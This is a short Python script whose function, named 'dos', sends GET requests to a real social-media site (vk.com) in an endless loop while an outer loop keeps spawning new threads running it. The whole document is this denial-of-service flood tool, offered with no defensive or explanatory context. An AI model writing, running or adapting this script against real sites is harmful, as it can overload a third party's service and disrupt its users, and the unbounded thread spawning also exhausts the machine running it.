import threading
import requests
def dos():
    while True:
        requests.get("https://vk.com")

while True:
    threading.Thread(target=dos).start()


